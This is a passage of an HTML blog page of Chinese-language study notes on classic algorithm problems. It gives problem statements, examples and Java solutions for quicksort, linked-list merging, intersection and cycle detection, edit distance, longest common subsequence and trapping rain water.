class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] sort1(<span class="keyword">int</span>[] arrays, <span class="keyword">int</span> left, <span class="keyword">int</span> right) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">          <span class="keyword">int</span> partition = partition1(arrays, left, right);</span><br><span class="line">          sort1(arrays, left, partition - <span class="number">1</span>);</span><br><span class="line">          sort1(arrays, partition + <span class="number">1</span>, right);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> arrays;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition1</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> l = left;</span><br><span class="line">      <span class="keyword">int</span> r = right;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">          <span class="keyword">while</span> (l &lt; r &amp;&amp; array[l] &lt; array[left]) &#123;</span><br><span class="line">              l++;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> (l &lt; r &amp;&amp; array[r] &gt;= array[left]) &#123;</span><br><span class="line">              r--;</span><br><span class="line">          &#125;</span><br><span class="line">          swap(array, l, r);</span><br><span class="line">      &#125;</span><br><span class="line">      swap(array, l, left);</span><br><span class="line">      <span class="keyword">return</span> l;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> temp = array[left];</span><br><span class="line">      array[left] = array[right];</span><br><span class="line">      array[right] = temp;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>时间复杂度O(nlogn)</p><p>空间复杂度O(logn)</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="21-合并两个有序列表"><a href="#21-合并两个有序列表" class="headerlink" title="21.合并两个有序列表"></a>21.合并两个有序列表</h3><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p><strong>示例 1：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/merge_ex1.jpg"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [1,2,4], l2 &#x3D; [1,3,4]</span><br><span class="line">输出：[1,1,2,3,4,4]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [], l2 &#x3D; []</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [], l2 &#x3D; [0]</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (list1 == <span class="keyword">null</span>) <span class="keyword">return</span> list2;</span><br><span class="line">  <span class="keyword">if</span> (list2 == <span class="keyword">null</span>) <span class="keyword">return</span> list1;</span><br><span class="line">  ListNode target = <span class="keyword">new</span> ListNode();</span><br><span class="line">  ListNode current = target;</span><br><span class="line">  <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">    <span class="comment">// 如果list1链表为空 直接挂list2在后面</span></span><br><span class="line">    <span class="keyword">if</span> (list1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">      current.next = list2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果list2链表为空 直接挂list1在后面</span></span><br><span class="line">    <span class="keyword">if</span> (list2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">      current.next = list1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (list1.val &lt; list2.val) &#123;</span><br><span class="line">      current.next = list1;</span><br><span class="line">      list1 = list1.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      current.next = list2;</span><br><span class="line">      list2 = list2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    current = current.next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> target.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="23-合并k个升序链表"><a href="#23-合并k个升序链表" class="headerlink" title="23.合并k个升序链表"></a>23.合并k个升序链表</h3><p>给你一个链表数组，每个链表都已经按升序排列。</p><p>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：lists &#x3D; [[1,4,5],[1,3,4],[2,6]]</span><br><span class="line">输出：[1,1,2,3,4,4,5,6]</span><br><span class="line">解释：链表数组如下：</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">将它们合并到一个有序链表中得到。</span><br><span class="line">1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：lists &#x3D; []</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：lists &#x3D; [[]]</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (lists.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (lists.length == <span class="number">1</span>) <span class="keyword">return</span> lists[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> dep(lists);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">dep</span><span class="params">(ListNode[] listNodes)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length = listNodes.length;</span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">1</span>) <span class="keyword">return</span> listNodes[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">2</span>) <span class="keyword">return</span> mergeTwoLists(listNodes[<span class="number">0</span>], listNodes[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">int</span> middle = length/<span class="number">2</span>;</span><br><span class="line">  ListNode left = dep(Arrays.copyOfRange(listNodes, <span class="number">0</span>, middle));</span><br><span class="line">  ListNode right = dep(Arrays.copyOfRange(listNodes, middle, length));</span><br><span class="line">  <span class="keyword">return</span> mergeTwoLists(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (list1 == <span class="keyword">null</span>) <span class="keyword">return</span> list2;</span><br><span class="line">  <span class="keyword">if</span> (list2 == <span class="keyword">null</span>) <span class="keyword">return</span> list1;</span><br><span class="line">  ListNode target = <span class="keyword">new</span> ListNode();</span><br><span class="line">  ListNode current = target;</span><br><span class="line">  <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (list1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">      current.next = list2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (list2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">      current.next = list1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (list1.val &lt; list2.val) &#123;</span><br><span class="line">      current.next = list1;</span><br><span class="line">      current = current.next;</span><br><span class="line">      list1 = list1.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      current.next = list2;</span><br><span class="line">      current = current.next;</span><br><span class="line">      list2 = list2.next;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> target.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LCR-023-相交链表"><a href="#LCR-023-相交链表" class="headerlink" title="LCR 023.相交链表"></a>LCR 023.相交链表</h3><p>给定两个单链表的头节点 <code>headA</code> 和 <code>headB</code> ，请找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 <code>null</code> 。</p><p>图示两个链表在节点 <code>c1</code> 开始相交<strong>：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/160_statement.png"></div></div><p>题目数据 <strong>保证</strong> 整个链式结构中不存在环。</p><p><strong>注意</strong>，函数返回结果后，链表必须 <strong>保持其原始结构</strong> 。</p><p><strong>示例 1：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/160_example_1.png"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3</span><br><span class="line">输出：Intersected at &#39;8&#39;</span><br><span class="line">解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。</span><br><span class="line">从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。</span><br><span class="line">在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/160_example_2.png"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1</span><br><span class="line">输出：Intersected at &#39;2&#39;</span><br><span class="line">解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。</span><br><span class="line">从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。</span><br><span class="line">在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/160_example_3.png"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2</span><br><span class="line">输出：null</span><br><span class="line">解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。</span><br><span class="line">由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。</span><br><span class="line">这两个链表不相交，因此返回 null 。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">  ListNode a = headA;</span><br><span class="line">  ListNode b = headB;</span><br><span class="line">  <span class="keyword">while</span> (a != b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="keyword">null</span>) a = headB;</span><br><span class="line">    <span class="keyword">else</span> a = a.next;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="keyword">null</span>) b = headA;</span><br><span class="line">    <span class="keyword">else</span> b = b.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141.环形链表"></a>141.环形链表</h3><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p><p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p><p><strong>示例 1：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/circularlinkedlist.png"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：head &#x3D; [3,2,0,-4], pos &#x3D; 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">  ListNode l = head, r = head;</span><br><span class="line">  <span class="keyword">while</span> (l != <span class="keyword">null</span> &amp;&amp; l.next != <span class="keyword">null</span> &amp;&amp; r.next != <span class="keyword">null</span> &amp;&amp; r.next.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">    l = l.next;</span><br><span class="line">    r = r.next.next;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="72-编辑距离"><a href="#72-编辑距离" class="headerlink" title="72.编辑距离"></a>72.编辑距离</h3><p>题目：给你两个单词 <code>word1</code> 和 <code>word2</code>， <em>请返回将 <code>word1</code> 转换成 <code>word2</code> 所使用的最少操作数</em> 。</p><p>你可以对一个单词进行如下三种操作：</p><ul><li>插入一个字符</li><li>删除一个字符</li><li>替换一个字符</li></ul><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 &#x3D; &quot;horse&quot;, word2 &#x3D; &quot;ros&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">horse -&gt; rorse (将 &#39;h&#39; 替换为 &#39;r&#39;)</span><br><span class="line">rorse -&gt; rose (删除 &#39;r&#39;)</span><br><span class="line">rose -&gt; ros (删除 &#39;e&#39;)</span><br></pre></td></tr></table></figure><p>递推公式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对于word1的位置i和word2的位置j</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、如果word1[i]和word2[j]相等，则不做任何操作。</span><br><span class="line">  </span><br><span class="line"><span class="number">2</span>、D[i][j-<span class="number">1</span>] 为 A 的前 i 个字符和 B 的前 j - <span class="number">1</span> 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们在 A 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i][j-<span class="number">1</span>] + <span class="number">1</span>；</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、D[i-<span class="number">1</span>][j] 为 A 的前 i - <span class="number">1</span> 个字符和 B 的前 j 个字符编辑距离的子问题。即对于 A 的第 i 个字符，我们在 B 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i-<span class="number">1</span>][j] + <span class="number">1</span>；</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、D[i-<span class="number">1</span>][j-<span class="number">1</span>] 为 A 前 i - <span class="number">1</span> 个字符和 B 的前 j - <span class="number">1</span> 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们修改 A 的第 i 个字符使它们相同，那么 D[i][j] 最小可以为 D[i-<span class="number">1</span>][j-<span class="number">1</span>] + <span class="number">1</span>。特别地，如果 A 的第 i 个字符和 B 的第 j 个字符原本就相同，那么我们实际上不需要进行修改操作。在这种情况下，D[i][j] 最小可以为 D[i-<span class="number">1</span>][j-<span class="number">1</span>]。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length1 = word1.length();</span><br><span class="line">  <span class="keyword">int</span> length2 = word2.length();</span><br><span class="line">  <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= length1; i++) &#123;</span><br><span class="line">    dp[i][<span class="number">0</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= length2; i++) &#123;</span><br><span class="line">    dp[<span class="number">0</span>][i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length1; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= length2; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (word1.charAt(i - <span class="number">1</span>) == word2.charAt(j - <span class="number">1</span>)) &#123;</span><br><span class="line">        dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dp[i][j] = Math.min(dp[i-<span class="number">1</span>][j] + <span class="number">1</span>, Math.min(dp[i][j - <span class="number">1</span>] + <span class="number">1</span>, dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LCR095-最长公共子序列"><a href="#LCR095-最长公共子序列" class="headerlink" title="LCR095.最长公共子序列"></a>LCR095.最长公共子序列</h3><p>题目：给定两个字符串 <code>text1</code> 和 <code>text2</code>，返回这两个字符串的最长 <strong>公共子序列</strong> 的长度。如果不存在 <strong>公共子序列</strong> ，返回 <code>0</code> 。</p><p>一个字符串的 <strong>子序列</strong> 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。</p><ul><li>例如，<code>&quot;ace&quot;</code> 是 <code>&quot;abcde&quot;</code> 的子序列，但 <code>&quot;aec&quot;</code> 不是 <code>&quot;abcde&quot;</code> 的子序列。</li></ul><p>两个字符串的 <strong>公共子序列</strong> 是这两个字符串所共同拥有的子序列。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：text1 &#x3D; &quot;abcde&quot;, text2 &#x3D; &quot;ace&quot; </span><br><span class="line">输出：3  </span><br><span class="line">解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(String text1, String text2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length1 = text1.length();</span><br><span class="line">    <span class="keyword">int</span> length2 = text2.length();</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length1; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= length2; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (text1.charAt(i - <span class="number">1</span>) == text2.charAt(j - <span class="number">1</span>)) &#123;</span><br><span class="line">          dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          dp[i][j] = Math.max(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42.接雨水"></a>42.接雨水</h3><p>给定 <code>n</code> 个非负整数表示每个宽度为 <code>1</code> 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。</p><p><strong>示例 1：</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/rainwatertrap.png"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]</span><br><span class="line">输出：6</span><br><span class="line">解释：上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 </span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [4,2,0,3,2,5]</span><br><span class="line">输出：9</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解法一 动态规划</span></span><br><span class="line"><span class="comment">// 使用一个temp数组存放每个位置能接的雨水</span></span><br><span class="line"><span class="comment">// 从左到右 每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，存放在temp[i]里面。</span></span><br><span class="line"><span class="comment">// 从右到左，每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，取和temp[i]相比的最小数值即temp[i] = Math.min(temp[i], max-height[i])。</span></span><br><span class="line"><span class="comment">// temp数组的加和即为接雨水的大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">trap1</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (height.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[height.length];</span><br><span class="line"><span class="keyword">int</span> max = height[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; height.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (height[i] &lt; max) &#123;</span><br><span class="line">temp[i] = max - height[i];</span><br><span class="line">&#125;</span><br><span class="line">max = Math.max(height[i], max);</span><br><span class="line">&#125;</span><br><span class="line">max = height[height.length - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = height.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="keyword">if</span> (height[i] &lt; max) &#123;</span><br><span 